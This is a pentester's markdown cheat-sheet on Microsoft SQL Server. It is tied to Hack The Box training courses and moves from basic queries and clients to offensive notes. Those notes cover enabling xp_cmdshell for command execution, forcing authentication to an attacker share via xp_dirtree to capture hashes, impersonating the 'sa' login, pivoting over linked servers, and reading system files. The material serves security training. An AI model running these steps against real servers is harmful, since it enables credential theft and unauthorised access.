# MSSQL 🐭

[![footprinting](../../../../cybersecurity/_badges/htb/footprinting.svg)](https://academy.hackthebox.com/course/preview/footprinting)
[![attacking_common_services](../../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)

<div class="row row-cols-lg-2"><div>

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It's often used by developers when building .NET applications. 

SQL Server Management Studio (SSMS) is a graphical client that can be installed along MSSQL or separately. It allows database administrators, developers, and other users to perform various tasks related to SQL Server databases.

🐲 MSSQL default port is 1433 or 2433 <small>(TCP)</small> and 1434 <small>(UDP)</small>.
</div><div>

Common commands:

```sql!
select name from sys.databases    -- list databases
select name from sys.databases where name not in ('master', 'tempdb', 'model', 'msdb');
use db_name;                      -- select a database
-- list the tables in the database
select table_name from information_schema.tables where table_type = 'base table';
-- list the columns of the table "table_name_here"
select column_name, data_type from information_schema.columns where table_name = 'table_name_here';
-- list users (1), and sysadmins (2)
SELECT name, password,sysadmin FROM syslogins
SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
```
</div></div>

<hr class="sep-both">

## MSSQL Clients

<div class="row row-cols-lg-2"><div>

#### Windows client - sqlcmd

On Windows, you can use the [sqlcmd](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver16&tabs=go%2Cwindows&pivots=cs1-bash) utility.

```ps
PS> # -E == Windows Auth | -Q == Query
PS> sqlcmd -E -Q "select name from sys.databases"
PS> sqlcmd -E -i query.sql
PS> sqlcmd -S server_name -U sa -P password [...]
```

If [WMI (DCOM)](/operating-systems/networking/protocols/wmi.md) is available, from a Linux host, you can access `sqlcmd` after popping a powershell:

```shell!
$ impacket-wmiexec username:password@IP -shell-type powershell
```
</div><div>

#### Linux client - sqlsh

You can use [sqlsh](https://en.wikipedia.org/wiki/Sqsh) on Linux.

```shell!
$ sqsh -S IP -U 'username' -P 'password' -h
$ sqsh -S IP -U '.\\username' -P 'password' -h
1> some query
2> go
```

#### Linux client - impacket

You can alternatively use [mssqlclient](/operating-systems/networking/protocols/tools/impacket.md#mssqlclient).

```shell!
$ impacket-mssqlclient username@IP -windows-auth
$ impacket-mssqlclient username:password@IP -windows-auth
```

The SQL Server might user Windows Authentication or Username/Password Authentication. Use or remove`-windows-auth` accordingly.
</div></div>


<hr class="sep-both">

## MSSQL Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

#### Enumeration

* We can use [nmap](/cybersecurity/red-team/tools/scanners/ports/nmap.md) to run scripts

```shell!
$ nmap -sC -sV --script "*ms-sql*" -p 1433 IP
```

* Look for interesting [Metasploit](/cybersecurity/red-team/tools/frameworks/metasploit/index.md) modules.

```shell!
mfs6> search mssql/
```

#### FootHold

[![attacking_common_services](../../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)

* You can use [Metasploit](/cybersecurity/red-team/tools/frameworks/metasploit/index.md) to XXX.

```shell!
mfs6> use mssql_enum_sql_logins
mfs6> set RHOSTS IP
mfs6> set USERNAME username
mfs6> set PASSWORD password
mfs6> set USE_WINDOWS_AUTHENT true
mfs6> run
```

#### Exploitation - Part I

[![attacking_common_services](../../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)

* [`xp_cmdshell`](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) can be used to run commands. It's disabled by default. The command is runs with the same permissions as the server.

```sql!
-- [EXECUTE] sp_configure 'show advanced options', 1
-- RECONFIGURE
-- [EXECUTE] sp_configure 'xp_cmdshell', 1
-- RECONFIGURE
xp_cmdshell 'whoami'
```

* We can steal hashes by setting up a [responder](/cybersecurity/red-team/_knowledge/topics/request_grabber.md#responder)

```sql!
EXEC master..xp_dirtree '\\IP\share\'
EXEC master..xp_subdirs '\\IP\share\'
```

* We may be able to impersonate users:

```sql!
-- list users we can impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
-- impersonate user 'sa'
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')
REVERT # cancel impersonation
```
</div><div>

#### Exploitation - Part II

* Extended Store Procedures
* CLR Assemblies
* SQL Server Agent Jobs
* External Scripts
* `xp_regwrite` can be used to create registry entries
* User Defined Functions in C/C++ ([ex](https://github.com/mysqludf/lib_mysqludf_sys))

#### Lateral Movement

[![attacking_common_services](../../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)

The current server may be linked to other servers. If we compromise it, we may be able to run SQL queries on linked servers.

* List Linked Servers

```sql!
SELECT srvname, isremote FROM sysservers
```

* Execute a SQL Query on a Linked Server

```sql!
EXEC('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [your_target_here]
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [your_target_here]
```

#### Additional Notes

* If installed, look for saved credentials in SSMS

* The services often runs as `NT SERVICE\MSSQLSERVER`

* By default, encryption is not enforced when attempting to connect.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* Try running the tool as administrator
* HeidiSQL, SQLPro, mssql-cli
* [System Databases](https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15)

```sql!
SELECT name FROM master.dbo.sysdatabases
SELECT table_name FROM xxx.INFORMATION_SCHEMA.TABLES
```
</div><div>

Write files

```sql!
-- enable to write
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE
-- use it...
-- can read any file
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

SSMS

* File > New > Query with current connection
* Press execute to run the file
* Need to add `GO`?
</div></div>